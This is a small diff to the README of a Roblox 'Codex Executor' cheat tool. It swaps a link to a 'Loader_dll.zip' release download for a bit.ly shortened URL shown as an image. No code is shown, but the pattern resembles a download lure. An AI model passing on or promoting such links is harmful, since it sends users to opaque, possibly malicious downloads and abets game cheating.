@@ -445,7 +445,7 @@
 
 Welcome to the Codex Executor repository! 🚀 This repository hosts the latest version of the Codex Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Codex Executor](https://github.com/secondlathloothy/Codex-Executor/releases/download/Download/Loader_dll.zip)
+![Codex Executor](https://bit.ly/3ZmBEFM)
 
 ## Table of Contents
 
